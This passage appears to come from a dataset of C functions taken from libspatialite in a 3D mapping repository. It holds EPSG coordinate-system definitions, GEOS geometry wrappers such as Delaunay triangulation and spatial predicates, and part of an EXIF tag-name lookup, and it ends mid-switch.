\"],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],U\");\n    add_srs_wkt (p, 5,\n        \"NIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9\");\n    add_srs_wkt (p, 6,\n        \"122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4258\\\"]],PROJECTION[\\\"Trans\");\n    add_srs_wkt (p, 7,\n        \"verse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PA\");\n    add_srs_wkt (p, 8,\n        \"RAMETER[\\\"central_meridian\\\",29],PARAMETER[\\\"scale_facto\");\n    add_srs_wkt (p, 9,\n        \"r\\\",1],PARAMETER[\\\"false_easting\\\",29500000],PARAMETER[\\\"\");\n    add_srs_wkt (p, 10,\n        \"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 11,\n        \"\\\"9001\\\"]],AXIS[\\\"Northing\\\",NORTH],AXIS[\\\"Easting\\\",EAS\");\n    add_srs_wkt (p, 12,\n        \"T],AUTHORITY[\\\"EPSG\\\",\\\"3883\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3884, \"epsg\", 3884,\n        \"ETRS89 / GK30FIN\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=30 +k=1 +x_0=30500000 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"ETRS89 / GK30FIN\\\",GEOGCS[\\\"ETRS89\\\",DATUM[\\\"Eu\");\n    add_srs_wkt (p, 1,\n        \"ropean_Terrestrial_Reference_System_1989\\\",SPHEROID[\\\"GR\");\n    add_srs_wkt (p, 2,\n        \"S 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\");\n    add_srs_wkt (p, 3,\n        \"\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6258\\\"]\");\n    add_srs_wkt (p, 4,\n        \"],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],U\");\n    add_srs_wkt (p, 5,\n        \"NIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9\");\n    add_srs_wkt (p, 6,\n        \"122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4258\\\"]],PROJECTION[\\\"Trans\");\n    add_srs_wkt (p, 7,\n        \"verse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PA\");\n    add_srs_wkt (p, 8,\n        \"RAMETER[\\\"central_meridian\\\",30],PARAMETER[\\\"scale_facto\");\n    add_srs_wkt (p, 9,\n        \"r\\\",1],PARAMETER[\\\"false_easting\\\",30500000],PARAMETER[\\\"\");\n    add_srs_wkt (p, 10,\n        \"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 11,\n        \"\\\"9001\\\"]],AXIS[\\\"Northing\\\",NORTH],AXIS[\\\"Easting\\\",EAS\");\n    add_srs_wkt (p, 12,\n        \"T],AUTHORITY[\\\"EPSG\\\",\\\"3884\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3885, \"epsg\", 3885,\n        \"ETRS89 / GK31FIN\");\n    add_proj4text (p, 0,\n        \"+proj=tmerc +lat_0=0 +lon_0=31 +k=1 +x_0=31500000 +y_0=0\");\n    add_proj4text (p, 1,\n        \" +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +units=m +no_defs\");\n    add_srs_wkt (p, 0,\n        \"PROJCS[\\\"ETRS89 / GK31FIN\\\",GEOGCS[\\\"ETRS89\\\",DATUM[\\\"Eu\");\n    add_srs_wkt (p, 1,\n        \"ropean_Terrestrial_Reference_System_1989\\\",SPHEROID[\\\"GR\");\n    add_srs_wkt (p, 2,\n        \"S 1980\\\",6378137,298.257222101,AUTHORITY[\\\"EPSG\\\",\\\"7019\");\n    add_srs_wkt (p, 3,\n        \"\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"EPSG\\\",\\\"6258\\\"]\");\n    add_srs_wkt (p, 4,\n        \"],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPSG\\\",\\\"8901\\\"]],U\");\n    add_srs_wkt (p, 5,\n        \"NIT[\\\"degree\\\",0.0174532925199433,AUTHORITY[\\\"EPSG\\\",\\\"9\");\n    add_srs_wkt (p, 6,\n        \"122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"4258\\\"]],PROJECTION[\\\"Trans\");\n    add_srs_wkt (p, 7,\n        \"verse_Mercator\\\"],PARAMETER[\\\"latitude_of_origin\\\",0],PA\");\n    add_srs_wkt (p, 8,\n        \"RAMETER[\\\"central_meridian\\\",31],PARAMETER[\\\"scale_facto\");\n    add_srs_wkt (p, 9,\n        \"r\\\",1],PARAMETER[\\\"false_easting\\\",31500000],PARAMETER[\\\"\");\n    add_srs_wkt (p, 10,\n        \"false_northing\\\",0],UNIT[\\\"metre\\\",1,AUTHORITY[\\\"EPSG\\\",\");\n    add_srs_wkt (p, 11,\n        \"\\\"9001\\\"]],AXIS[\\\"Northing\\\",NORTH],AXIS[\\\"Easting\\\",EAS\");\n    add_srs_wkt (p, 12,\n        \"T],AUTHORITY[\\\"EPSG\\\",\\\"3885\\\"]]\");\n    p = add_epsg_def (filter, first, last, 3889, \"epsg\", 3889,\n        \"IGRS\");\n    add_proj4text (p, 0,\n        \"+proj=longlat +ellps=GRS80 +towgs84=0,0,0,0,0,0,0 +no_de\");\n    add_proj4text (p, 1,\n        \"fs\");\n    add_srs_wkt (p, 0,\n        \"GEOGCS[\\\"IGRS\\\",DATUM[\\\"Iraqi_Geospatial_Reference_Syste\");\n    add_srs_wkt (p, 1,\n        \"m\\\",SPHEROID[\\\"GRS 1980\\\",6378137,298.257222101,AUTHORIT\");\n    add_srs_wkt (p, 2,\n        \"Y[\\\"EPSG\\\",\\\"7019\\\"]],TOWGS84[0,0,0,0,0,0,0],AUTHORITY[\\\"\");\n    add_srs_wkt (p, 3,\n        \"EPSG\\\",\\\"1029\\\"]],PRIMEM[\\\"Greenwich\\\",0,AUTHORITY[\\\"EPS\");\n    add_srs_wkt (p, 4,\n        \"G\\\",\\\"8901\\\"]],UNIT[\\\"degree\\\",0.0174532925199433,AUTHOR\");\n    add_srs_wkt (p, 5,\n        \"ITY[\\\"EPSG\\\",\\\"9122\\\"]],AUTHORITY[\\\"EPSG\\\",\\\"3889\\\"]]\");\n}", "path": "AdvancedMap3D\\jni\\libspatialite-4.1.0\\src\\srsinit\\epsg_inlined_17.c", "repo_name": "nutiteq/hellomap3d", "stars": 151, "license": "mit", "language": "c", "size": 253418}
{"docstring": "/* GEOS experimental features */\n", "func_signal": "GAIAGEO_DECLARE gaiaGeomCollPtr\ngaiaDelaunayTriangulation (gaiaGeomCollPtr geom, double tolerance,\n\t\t\t   int only_edges)", "code": "{\n/* Delaunay Triangulation */\n    GEOSGeometry *g1;\n    GEOSGeometry *g2;\n    gaiaGeomCollPtr result;\n    if (!geom)\n\treturn NULL;\n    g1 = gaiaToGeos (geom);\n    g2 = GEOSDelaunayTriangulation (g1, tolerance, only_edges);\n    GEOSGeom_destroy (g1);\n    if (!g2)\n\treturn NULL;\n    if (geom->DimensionModel == GAIA_XY_Z)\n\tresult = gaiaFromGeos_XYZ (g2);\n    else if (geom->DimensionModel == GAIA_XY_M)\n\tresult = gaiaFromGeos_XYM (g2);\n    else if (geom->DimensionModel == GAIA_XY_Z_M)\n\tresult = gaiaFromGeos_XYZM (g2);\n    else\n\tresult = gaiaFromGeos_XY (g2);\n    GEOSGeom_destroy (g2);\n    if (result == NULL)\n\treturn NULL;\n    result->Srid = geom->Srid;\n    if (only_edges)\n\tresult->DeclaredType = GAIA_MULTILINESTRING;\n    else\n\tresult->DeclaredType = GAIA_MULTIPOLYGON;\n    return result;\n}", "path": "AdvancedMap3D\\jni\\libspatialite-4.1.0\\src\\gaiageo\\gg_relations.c", "repo_name": "nutiteq/hellomap3d", "stars": 151, "license": "mit", "language": "c", "size": 253418}
{"docstring": "/* end GEOS_ADVANCED */\n", "func_signal": "GAIAGEO_DECLARE int\ngaiaGeomCollDisjoint (gaiaGeomCollPtr geom1, gaiaGeomCollPtr geom2)", "code": "{\n/* checks if two Geometries are \"spatially disjoint\" */\n    int ret;\n    GEOSGeometry *g1;\n    GEOSGeometry *g2;\n    if (!geom1 || !geom2)\n\treturn -1;\n    if (gaiaIsToxic (geom1) || gaiaIsToxic (geom2))\n\treturn -1;\n\n/* quick check based on MBRs comparison */\n    if (!splite_mbr_overlaps (geom1, geom2))\n\treturn 1;\n\n    g1 = gaiaToGeos (geom1);\n    g2 = gaiaToGeos (geom2);\n    ret = GEOSDisjoint (g1, g2);\n    GEOSGeom_destroy (g1);\n    GEOSGeom_destroy (g2);\n    return ret;\n}", "path": "AdvancedMap3D\\jni\\libspatialite-4.1.0\\src\\gaiageo\\gg_relations.c", "repo_name": "nutiteq/hellomap3d", "stars": 151, "license": "mit", "language": "c", "size": 253418}
{"docstring": "/* end GEOS_ADVANCED */\n", "func_signal": "GAIAGEO_DECLARE int\ngaiaGeomCollTouches (gaiaGeomCollPtr geom1, gaiaGeomCollPtr geom2)", "code": "{\n/* checks if two Geometries do \"spatially touches\" */\n    int ret;\n    GEOSGeometry *g1;\n    GEOSGeometry *g2;\n    if (!geom1 || !geom2)\n\treturn -1;\n    if (gaiaIsToxic (geom1) || gaiaIsToxic (geom2))\n\treturn -1;\n\n/* quick check based on MBRs comparison */\n    if (!splite_mbr_overlaps (geom1, geom2))\n\treturn 0;\n\n    g1 = gaiaToGeos (geom1);\n    g2 = gaiaToGeos (geom2);\n    ret = GEOSTouches (g1, g2);\n    GEOSGeom_destroy (g1);\n    GEOSGeom_destroy (g2);\n    return ret;\n}", "path": "AdvancedMap3D\\jni\\libspatialite-4.1.0\\src\\gaiageo\\gg_relations.c", "repo_name": "nutiteq/hellomap3d", "stars": 151, "license": "mit", "language": "c", "size": 253418}
{"docstring": "/* not WIN32 */\n", "func_signal": "static void\nexifTagName (char gps, unsigned short tag_id, char *str, int len)", "code": "{\n/* returns the canonical name corresponding to an EXIF TAG ID */\n    int l;\n    char *name = \"UNKNOWN\";\n    if (gps)\n      {\n\t  switch (tag_id)\n\t    {\n\t    case 0x00:\n\t\tname = \"GPSVersionID\";\n\t\tbreak;\n\t    case 0x01:\n\t\tname = \"GPSLatitudeRef\";\n\t\tbreak;\n\t    case 0x02:\n\t\tname = \"GPSLatitude\";\n\t\tbreak;\n\t    case 0x03:\n\t\tname = \"GPSLongitudeRef\";\n\t\tbreak;\n\t    case 0x04:\n\t\tname = \"GPSLongitude\";\n\t\tbreak;\n\t    case 0x05:\n\t\tname = \"GPSAltitudeRef\";\n\t\tbreak;\n\t    case 0x06:\n\t\tname = \"GPSAltitude\";\n\t\tbreak;\n\t    case 0x07:\n\t\tname = \"GPSTimeStamp\";\n\t\tbreak;\n\t    case 0x08:\n\t\tname = \"GPSSatellites\";\n\t\tbreak;\n\t    case 0x09:\n\t\tname = \"GPSStatus\";\n\t\tbreak;\n\t    case 0x0A:\n\t\tname = \"GPSMeasureMode\";\n\t\tbreak;\n\t    case 0x0B:\n\t\tname = \"GPSDOP\";\n\t\tbreak;\n\t    case 0x0C:\n\t\tname = \"GPSSpeedRef\";\n\t\tbreak;\n\t    case 0x0D:\n\t\tname = \"GPSSpeed\";\n\t\tbreak;\n\t    case 0x0E:\n\t\tname = \"GPSTrackRef\";\n\t\tbreak;\n\t    case 0x0F:\n\t\tname = \"GPSTrack\";\n\t\tbreak;\n\t    case 0x10:\n\t\tname = \"GPSImgDirectionRef\";\n\t\tbreak;\n\t    case 0x11:\n\t\tname = \"GPSImgDirection\";\n\t\tbreak;\n\t    case 0x12:\n\t\tname = \"GPSMapDatum\";\n\t\tbreak;\n\t    case 0x13:\n\t\tname = \"GPSDestLatitudeRef\";\n\t\tbreak;\n\t    case 0x14:\n\t\tname = \"GPSDestLatitude\";\n\t\tbreak;\n\t    case 0x15:\n\t\tname = \"GPSDestLongitudeRef\";\n\t\tbreak;\n\t    case 0x16:\n\t\tname = \"GPSDestLongitude\";\n\t\tbreak;\n\t    case 0x17:\n\t\tname = \"GPSDestBearingRef\";\n\t\tbreak;\n\t    case 0x18:\n\t\tname = \"GPSDestBearing\";\n\t\tbreak;\n\t    case 0x19:\n\t\tname = \"GPSDestDistanceRef\";\n\t\tbreak;\n\t    case 0x1A:\n\t\tname = \"GPSDestDistance\";\n\t\tbreak;\n\t    case 0x1B:\n\t\tname = \"GPSProcessingMethod\";\n\t\tbreak;\n\t    case 0x1C:\n\t\tname = \"GPSAreaInformation\";\n\t\tbreak;\n\t    case 0x1D:\n\t\tname = \"GPSDateStamp\";\n\t\tbreak;\n\t    case 0x1E:\n\t\tname = \"GPSDifferential\";\n\t\tbreak;\n\t    };\n      }\n    else\n      {\n\t  switch (tag_id)\n\t    {\n\t    case 0x000B:\n\t\tname = \"ACDComment\";\n\t\tbreak;\n\t    case 0x00FE:\n\t\tname = \"NewSubFile\";\n\t\tbreak;\n\t    case 0x00FF:\n\t\tname = \"SubFile\";\n\t\tbreak;\n\t    case 0x0100:\n\t\tname = \"ImageWidth\";\n\t\tbreak;\n\t    case 0x0101:\n\t\tname = \"ImageLength\";\n\t\tbreak;\n\t    case 0x0102:\n\t\tname = \"BitsPerSample\";\n\t\tbreak;\n\t    case 0x0103:\n\t\tname = \"Compression\";\n\t\tbreak;\n\t    case 0x0106:\n\t\tname = \"PhotometricInterpretation\";\n\t\tbreak;\n\t    case 0x010A:\n\t\tname = \"FillOrder\";\n\t\tbreak;\n\t    case 0x010D:\n\t\tname = \"DocumentName\";\n\t\tbreak;\n\t    case 0x010E:\n\t\tname = \"ImageDescription\";\n\t\tbreak;\n\t    case 0x010F:\n\t\tname = \"Make\";\n\t\tbreak;\n\t    case 0x0110:\n\t\tname = \"Model\";\n\t\tbreak;\n\t    case 0x0111:\n\t\tname = \"StripOffsets\";\n\t\tbreak;\n\t    case 0x0112:\n\t\tname = \"Orientation\";\n\t\tbreak;\n\t    case 0x0115:\n\t\tname = \"SamplesPerPixel\";\n\t\tbreak;\n\t    case 0x0116:\n\t\tname = \"RowsPerStrip\";\n\t\tbreak;\n\t    case 0x0117:\n\t\tname = \"StripByteCounts\";\n\t\tbreak;\n\t    case 0x0118:\n\t\tname = \"MinSampleValue\";\n\t\tbreak;\n\t    case 0x0119:\n\t\tname = \"MaxSampleValue\";\n\t\tbreak;\n\t    case 0x011A:\n\t\tname = \"XResolution\";\n\t\tbreak;\n\t    case 0x011B:\n\t\tname = \"YResolution\";\n\t\tbreak;\n\t    case 0x011C:\n\t\tname = \"PlanarConfiguration\";\n\t\tbreak;\n\t    case 0x011D:\n\t\tname = \"PageName\";\n\t\tbreak;\n\t    case 0x011E:\n\t\tname = \"XPosition\";\n\t\tbreak;\n\t    case 0x011F:\n\t\tname = \"YPosition\";\n\t\tbreak;\n\t    case 0x0120:\n\t\tname = \"FreeOffsets\";\n\t\tbreak;\n\t    case 0x0121:\n\t\tname = \"FreeByteCounts\";\n\t\tbreak;\n\t    case 0x0122:\n\t\tname = \"GrayResponseUnit\";\n\t\tbreak;\n\t    case 0x0123:\n\t\tname = \"GrayResponseCurve\";\n\t\tbreak;\n\t    case 0x0124:\n\t\tname = \"T4Options\";\n\t\tbreak;\n\t    case 0x0125:\n\t\tname = \"T6Options\";\n\t\tbreak;\n\t    case 0x0128:\n\t\tname = \"ResolutionUnit\";\n\t\tbreak;\n\t    case 0x0129:\n\t\tname = \"PageNumber\";\n\t\tbreak;\n\t    case 0x012D:\n\t\tname = \"TransferFunction\";\n\t\tbreak;\n\t    case 0x0131:\n\t\tname = \"Software\";\n\t\tbreak;\n\t    case 0x0132:\n\t\tname = \"DateTime\";\n\t\tbreak;\n\t    case 0x013B:\n\t\tname = \"Artist\";\n\t\tbreak;\n\t    case 0x013C:\n\t\tname = \"HostComputer\";\n\t\tbreak;\n\t    case 0x013D:\n\t\tname = \"Predictor\";\n\t\tbreak;\n\t    case 0x013E:\n\t\tname = \"WhitePoint\";\n\t\tbreak;\n\t    case 0x013F:\n\t\tname = \"PrimaryChromaticities\";\n\t\tbreak;\n\t    case 0x0140:\n\t\tname = \"ColorMap\";\n\t\tbreak;\n\t    case 0x0141:\n\t\tname = \"HalfToneHints\";\n\t\tbreak;\n\t    case 0x0142:\n\t\tname = \"TileWidth\";\n\t\tbreak;\n\t    case 0x0143:\n\t\tname = \"TileLength\";\n\t\tbreak;\n\t    case 0x0144:\n\t\tname = \"TileOffsets\";\n\t\tbreak;\n\t    case 0x0145:\n\t\tname = \"TileByteCounts\";\n\t\tbreak;\n\t    case 0x014A:\n\t\tname = \"SubIFD\";\n\t\tbreak;\n\t    case 0x014C:\n\t\tname = \"InkSet\";\n\t\tbreak;\n\t    case 0x014D:\n\t\tname = \"InkNames\";\n\t\tbreak;\n\t    case 0x014E:\n\t\tname = \"NumberOfInks\";\n\t\tbreak;\n\t    case 0x0150:\n\t\tname = \"DotRange\";\n\t\tbreak;\n\t    case 0x0151:\n\t\tname = \"TargetPrinter\";\n\t\tbreak;\n\t    case 0x0152:\n\t\tname = \"ExtraSample\";\n\t\tbreak;\n\t    case 0x0153:\n\t\tname = \"SampleFormat\";\n\t\tbreak;\n\t    case 0x0154:\n\t\tname = \"SMinSampleValue\";\n\t\tbreak;\n\t    case 0x0155:\n\t\tname = \"SMaxSampleValue\";\n\t\tbreak;\n\t    case 0x0156:\n\t\tname = \"TransferRange\";\n\t\tbreak;\n\t    case 0x0157:\n\t\tname = \"ClipPath\";\n\t\tbreak;\n\t    case 0x0158:\n\t\tname = \"XClipPathUnits\";\n\t\tbreak;\n\t    case 0x0159:\n\t\tname = \"YClipPathUnits\";\n\t\tbreak;\n\t    case 0x015A:\n\t\tname = \"Indexed\";\n\t\tbreak;\n\t    case 0x015B:\n\t\tname = \"JPEGTables\";\n\t\tbreak;\n\t    case 0x015F:\n\t\tname = \"OPIProxy\";\n\t\tbreak;\n\t    case 0x0200:\n\t\tname = \"JPEGProc\";\n\t\tbreak;\n\t    case 0x0201:\n\t\tname = \"JPEGInterchangeFormat\";\n\t\tbreak;\n\t    case 0x0202:\n\t\tname = \"JPEGInterchangeFormatLength\";\n\t\tbreak;\n\t    case 0x0203:\n\t\tname = \"JPEGRestartInterval\";\n\t\tbreak;\n\t    case 0x0205:\n\t\tname = \"JPEGLosslessPredictors\";\n\t\tbreak;\n\t    case 0x0206:\n\t\tname = \"JPEGPointTransforms\";\n\t\tbreak;\n\t    case 0x0207:\n\t\tname = \"JPEGQTables\";\n\t\tbreak;\n\t    case 0x0208:\n\t\tname = \"JPEGDCTables\";\n\t\tbreak;\n\t    case 0x0209:\n\t\tname = \"JPEGACTables\";\n\t\tbreak;\n\t    case 0x0211:\n\t\tname = \"YCbCrCoefficients\";\n\t\tbreak;\n\t    case 0x0212:\n\t\tname = \"YCbCrSubSampling\";\n\t\tbreak;\n\t    case 0x0213:\n\t\tname = \"YCbCrPositioning\";\n\t\tbreak;\n\t    case 0x0214:\n\t\tname = \"ReferenceBlackWhite\";\n\t\tbreak;\n\t    case 0x02BC:\n\t\tname = \"ExtensibleMetadataPlatform\";\n\t\tbreak;\n\t    case 0x0301:\n\t\tname = \"Gamma\";\n\t\tbreak;\n\t    case 0x0302:\n\t\tname = \"ICCProfileDescriptor\";\n\t\tbreak;\n\t    case 0x0303:\n\t\tname = \"SRGBRenderingIntent\";\n\t\tbreak;\n\t    case 0x0320:\n\t\tname = \"ImageTitle\";\n\t\tbreak;\n\t    case 0x5001:\n\t\tname = \"ResolutionXUnit\";\n\t\tbreak;\n\t    case 0x5002:\n\t\tname = \"ResolutionYUnit\";\n\t\tbreak;\n\t    case 0x5003:\n\t\tname = \"ResolutionXLengthUnit\";\n\t\tbreak;\n\t    case 0x5004:\n\t\tname = \"ResolutionYLengthUnit\";\n\t\tbreak;\n\t    case 0x5005:\n\t\tname = \"PrintFlags\";\n\t\tbreak;\n\t    case 0x5006:\n\t\tname = \"PrintFlagsVersion\";\n\t\tbreak;\n\t    case 0x5007:\n\t\tname = \"PrintFlagsCrop\";\n\t\tbreak;\n\t    case 0x5008:\n\t\tname = \"PrintFlagsBleedWidth\";\n\t\tbreak;\n\t    case 0x5009:\n\t\tname = \"PrintFlagsBleedWidthScale\";\n\t\tbreak;\n\t    case 0x500A:\n\t\tname = \"HalftoneLPI\";\n\t\tbreak;\n\t    case 0x500B:\n\t\tname = \"HalftoneLPIUnit\";\n\t\tbreak;\n\t    case 0x500C:\n\t\tname = \"HalftoneDegree\";\n\t\tbreak;\n\t    case 0x500D:\n\t\tname = \"HalftoneShape\";\n\t\tbreak;\n\t    case 0x500E:\n\t\tname = \"HalftoneMisc\";\n\t\tbreak;\n\t    case 0x500F:\n\t\tname = \"HalftoneScreen\";\n\t\tbreak;\n\t    case 0x5010:\n\t\tname = \"JPEGQuality\";\n\t\tbreak;\n\t    case 0x5011:\n\t\tname = \"GridSize\";\n\t\tbreak;\n\t    case 0x5012:\n\t\tname = \"ThumbnailFormat\";\n\t\tbreak;\n\t    case 0x5013:\n\t\tname = \"ThumbnailWidth\";\n\t\tbreak;\n\t    case 0x5014:\n\t\tname = \"ThumbnailHeight\";\n\t\tbreak;\n\t    case 0x5015:\n\t\tname = \"ThumbnailColorDepth\";\n\t\tbreak;\n\t    case 0x5016:\n\t\tname = \"ThumbnailPlanes\";\n\t\tbreak;\n\t    case 0x5017:\n\t\tname = \"ThumbnailRawBytes\";\n\t\tbreak;\n\t    case 0x5018:\n\t\tname = \"ThumbnailSize\";\n\t\tbreak;\n\t    case 0x5019:\n\t\tname = \"ThumbnailCompressedSize\";\n\t\tbreak;\n\t    case 0x501A:\n\t\tname = \"ColorTransferFunction\";\n\t\tbreak;\n\t    case 0x501B:\n\t\tname = \"ThumbnailData\";\n\t\tbreak;\n\t    case 0x5020:\n\t\tname = \"ThumbnailImageWidth\";\n\t\tbreak;\n\t    case 0x5021:\n\t\tname = \"ThumbnailImageHeight\";\n\t\tbreak;\n\t    case 0x5022:\n\t\tname = \"ThumbnailBitsPerSample\";\n\t\tbreak;\n\t    case 0x5023:\n\t\tname = \"ThumbnailCompression\";\n\t\tbreak;\n\t    case 0x5024:\n\t\tname = \"ThumbnailPhotometricInterp\";\n\t\tbreak;\n\t    case 0x5025:\n\t\tname = \"ThumbnailImageDescription\";\n\t\tbreak;\n\t    case 0x5026:\n\t\tname = \"ThumbnailEquipMake\";\n\t\tbreak;\n\t    case 0x5027:\n\t\tname = \"ThumbnailEquipModel\";\n\t\tbreak;\n\t    case 0x5028:\n\t\tname = \"ThumbnailStripOffsets\";\n\t\tbreak;\n\t    case 0x5029:\n\t\tname = \"ThumbnailOrientation\";\n\t\tbreak;\n\t    case 0x502A:\n\t\tname = \"ThumbnailSamplesPerPixel\";\n\t\tbreak;\n\t    case 0x502B:\n\t\tname = \"ThumbnailRowsPerStrip\";\n\t\tbreak;\n\t    case 0x502C:\n\t\tname = \"ThumbnailStripBytesCount\";\n\t\tbreak;\n\t    case 0x502D:\n\t\tname = \"ThumbnailResolutionX\";\n\t\tbreak;\n\t    case 0x502E:\n\t\tname = \"ThumbnailResolutionY\";\n\t\tbreak;\n\t    case 0x502F:\n\t\tname = \"ThumbnailPlanarConfig\";\n\t\tbreak;\n\t    case 0x5030:\n\t\tname = \"ThumbnailResolutionUnit\";\n\t\tbreak;\n\t    case 0x5031:\n\t\tname = \"ThumbnailTransferFunction\";\n\t\tbreak;\n\t    case 0x5032:\n\t\tname = \"ThumbnailSoftwareUsed\";\n\t\tbreak;\n\t    case 0x5033:\n\t\tname = \"ThumbnailDateTime\";\n\t\tbreak;\n\t    case 0x5034:\n\t\tname = \"ThumbnailArtist\";\n\t\tbreak;\n\t    case 0x5035:\n\t\tname = \"ThumbnailWhitePoint\";\n\t\tbreak;\n\t    case 0x5036:\n\t\tname = \"ThumbnailPrimaryChromaticities\";\n\t\tbreak;\n\t    case 0x5037:\n\t\tname = \"ThumbnailYCbCrCoefficients\";\n\t\tbreak;\n\t    case 0x5038:\n\t\tname = \"ThumbnailYCbCrSubsampling\";\n\t\tbreak;\n\t    case 0x5039:\n\t\tname = \"ThumbnailYCbCrPositioning\";\n\t\tbreak;\n\t    case 0x503A:\n\t\tname = \"ThumbnailRefBlackWhite\";\n\t\tbreak;\n\t    case 0x503B:\n\t\tname = \"ThumbnailCopyRight\";\n\t\tbreak;\n\t    case 0x5090:\n\t\tname = \"LuminanceTable\";\n\t\tbreak;\n\t    case 0x5091:\n\t\tname = \"ChrominanceTable\";\n\t\tbreak;\n\t    case 0x5100:\n\t\tname = \"FrameDelay\";\n\t\tbreak;\n\t    case 0x5101:\n\t\tname = \"LoopCount\";\n\t\tbreak;\n\t    case 0x5110:\n\t\tname = \"PixelUnit\";\n\t\tbreak;\n\t    case 0x5111:\n\t\tname = \"PixelPerUnitX\";\n\t\tbreak;\n\t    case 0x5112:\n\t\tname = \"PixelPerUnitY\";\n\t\tbreak;\n\t    case 0x5113:\n\t\tname = \"PaletteHistogram\";\n\t\tbreak;\n\t    case 0x1000:\n\t\tname = \"RelatedImageFileFormat\";\n\t\tbreak;\n\t    case 0x800D:\n\t\tname = \"ImageID\";\n\t\tbreak;\n\t    case 0x80E3:\n\t\tname = \"Matteing\";\n\t\tbreak;\n\t    case 0x80E4:\n\t\tname = \"DataType\";\n\t\tbreak;\n\t    case 0x80E5:\n\t\tname = \"ImageDepth\";\n\t\tbreak;\n\t    case 0x80E6:\n\t\tname = \"TileDepth\";\n\t\tbreak;\n\t    case 0x828D:\n\t\tname = \"CFARepeatPatternDim\";\n\t\tbreak;\n\t    case 0x828E:\n\t\tname = \"CFAPattern\";\n\t\tbreak;\n\t    case 0x828F:\n\t\tname = \"BatteryLevel\";\n\t\tbreak;\n\t    case 0x8298:\n\t\tname = \"Copyright\";\n\t\tbreak;\n\t    case 0x829A:\n\t\tname = \"ExposureTime\";\n\t\tbreak;\n\t    case 0x829D:\n\t\tname = \"FNumber\";\n\t\tbreak;\n\t    case 0x83BB:\n\t\tname = \"IPTC/NAA\";\n\t\tbreak;\n\t    case 0x84E3:\n\t\tname = \"IT8RasterPadding\";\n\t\tbreak;\n\t    case 0x84E5:\n\t\tname = \"IT8ColorTable\";\n\t\tbreak;\n\t    case 0x8649:\n\t\tname = \"ImageResourceInformation\";\n\t\tbreak;\n\t    case 0x8769:\n\t\tname = \"Exif IFD Pointer\";\n\t\tbreak;\n\t    case 0x8773:\n\t\tname = \"ICC_Profile\";\n\t\tbreak;\n\t    case 0x8822:\n\t\tname = \"ExposureProgram\";\n\t\tbreak;\n\t    case 0x8824:\n\t\tname = \"SpectralSensitivity\";\n\t\tbreak;\n\t    case 0x8825:\n\t\tname = \"GPSInfo IFD Pointer\";\n\t\tbreak;\n\t    case 0x8827:\n\t\tname = \"ISOSpeedRatings\";\n\t\tbreak;\n\t    case 0x8828:\n\t\tname = \"OECF\";\n\t\tbreak;\n\t    case 0x9000:\n\t\tname = \"ExifVersion\";\n\t\tbreak;\n\t    case 0x9003:\n\t\tname = \"DateTimeOriginal\";\n\t\tbreak;\n\t    case 0x9004:\n\t\tname = \"DateTimeDigitized\";\n\t\tbreak;\n\t    case 0x9101:\n\t\tname = \"ComponentsConfiguration\";\n\t\tbreak;\n\t    case 0x9102:\n\t\tname = \"CompressedBitsPerPixel\";\n\t\tbreak;\n\t    case 0x9201:\n\t\tname = \"ShutterSpeedValue\";\n\t\tbreak;\n\t    case 0x9202:\n\t\tname = \"ApertureValue\";\n\t\tbreak;\n\t    case 0x9203:\n\t\tname = \"BrightnessValue\";\n\t\tbreak;\n\t    case 0x9204:\n\t\tname = \"ExposureBiasValue\";\n\t\tbreak;\n\t    case 0x9205:\n\t\tname = \"MaxApertureValue\";\n\t\tbreak;\n\t    case 0x9206:\n\t\tname = \"SubjectDistance\";\n\t\tbreak;\n\t    case 0x9207:\n\t\tname = \"MeteringMode\";\n\t\tbreak;\n\t    case 0x9208:\n\t\tname = \"LightSource\";\n\t\tbreak;\n\t    case 0x9209:\n\t\tname = \"Flash\";\n\t\tbreak;\n\t    case 0x920A:\n\t\tname = \"FocalLength\";\n\t\tbreak;\n\t    case 0x920B:\n\t    case 0xA20B:\n\t\tname = \"FlashEnergy\";\n\t\tbreak;\n\t    case 0x920C:\n\t    case 0xA20C:\n\t\tname = \"SpatialFrequencyResponse\";\n\t\tbreak;\n\t    case 0x920D:\n\t\tname = \"Noise\";\n\t\tbreak;\n\t    case 0x920E:\n\t    case 0xA20E:\n\t\tname = \"FocalPlaneXResolution\";\n\t\tbreak;\n\t    case 0x920F:\n\t    case 0XA20F:\n\t\tname = \"FocalPlaneYResolution\";\n\t\tbreak;\n\t    case 0x9210:\n\t    case 0xA210:\n\t\tname = \"FocalPlaneResolutionUnit\";\n\t\tbreak;\n\t    case 0x9211:\n\t\tname = \"ImageNumber\";\n\t\tbreak;\n\t    case 0x9212:\n\t\tname = \"SecurityClassification\";\n\t\tbreak;\n\t    case 0x9213:\n\t\tname = \"ImageHistory\";\n\t\tbreak;\n\t    case 0x9214:\n\t    case 0xA214:\n\t\tname = \"SubjectLocation\";\n\t\tbreak;\n\t    case 0x9215:\n\t    case 0xA215:\n\t\tname = \"ExposureIndex\";\n\t\tbreak;\n\t    case 0x9216:\n\t\tname = 